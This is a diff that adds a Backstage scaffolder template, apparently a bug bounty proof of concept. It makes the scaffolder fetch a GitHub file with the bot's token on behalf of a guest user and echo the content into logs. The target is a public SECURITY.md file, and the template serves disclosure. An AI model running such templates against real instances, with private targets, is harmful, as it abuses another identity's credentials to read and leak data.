@@ -1,0 +1,28 @@
+  apiVersion: scaffolder.backstage.io/v1beta3
+  kind: Template
+  metadata:
+    name: ssrf-exfil-poc
+    title: SSRF/exfil PoC for FINDING_1
+    description: Bug bounty PoC — proves guest can read github content via bot's PAT
+  spec:
+    owner: user:default/guest
+    type: service
+    parameters: []
+    steps:
+      - id: fetch-target
+        name: Fetch a github URL via bot identity
+        action: fetch:plain
+        input:
+          url: https://github.com/backstage/backstage/raw/master/SECURITY.md
+          targetPath: ./fetched
+      - id: log-files
+        name: Log workspace listing
+        action: debug:log
+        input:
+          listWorkspace: true
+          message: "Workspace after fetch (PoC marker)"
+      - id: log-content
+        name: Log fetched file content
+        action: debug:log
+        input:
+          message: "FETCHED_FILE_MARKER: ${{ steps['fetch-target'].output.content }}"
